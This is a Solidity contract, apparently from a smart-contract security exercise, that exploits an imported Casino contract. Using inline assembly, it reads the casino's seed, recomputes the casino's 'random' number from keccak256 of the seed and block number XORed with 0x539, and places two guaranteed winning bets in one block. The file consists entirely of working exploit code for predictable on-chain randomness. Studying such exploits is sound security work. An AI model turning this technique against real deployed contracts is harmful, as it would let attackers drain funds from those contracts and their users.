// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "./Casino.sol";

/**
 * @title CasinoAssemblyAttack
 * @notice Low-level version of the casino exploit implemented entirely in assembly
 * @dev Showcases how easy it is to compute the same "random" number as the casino
 */
contract CasinoAssemblyAttack {
    Casino public immutable casino;
    address public immutable attacker;

    uint32 private constant GET_SEED_SELECTOR = uint32(bytes4(Casino.getSeed.selector));
    uint32 private constant BET_SELECTOR = uint32(bytes4(Casino.bet.selector));

    constructor(address casinoAddress) {
        casino = Casino(casinoAddress);
        attacker = msg.sender;
    }

    modifier onlyAttacker() {
        require(msg.sender == attacker, "Not authorized");
        _;
    }

    /**
     * @notice Attack the casino using pure assembly calls
     * @dev Demonstrates manual calldata crafting, keccak usage, and xor operations
     */
    function assemblyWin() external onlyAttacker {
        address target = address(casino);
        uint32 getSeedSelector = GET_SEED_SELECTOR;
        uint32 betSelector = BET_SELECTOR;

        assembly {
            let freePtr := mload(0x40)

            // --- Load seed via staticcall to getSeed() ---
            mstore(freePtr, shl(224, getSeedSelector))
            let success := staticcall(gas(), target, freePtr, 0x04, freePtr, 0x20)
            if iszero(success) {
                revert(0, 0)
            }
            let seed := mload(freePtr)

            // --- Compute keccak256(seed, block.number) ---
            mstore(freePtr, seed)
            mstore(add(freePtr, 0x20), number())
            let predicted := keccak256(freePtr, 0x40)

            // XOR with constant 0x539 to get the casino's number
            predicted := xor(predicted, 0x539)

            // Prepare calldata for bet(uint256)
            mstore(freePtr, shl(224, betSelector))
            mstore(add(freePtr, 0x04), predicted)

            // First winning bet
            success := call(gas(), target, 0, freePtr, 0x24, 0, 0)
            if iszero(success) {
                revert(0, 0)
            }

            // Second winning bet in the same block
            success := call(gas(), target, 0, freePtr, 0x24, 0, 0)
            if iszero(success) {
                revert(0, 0)
            }
        }
    }
}
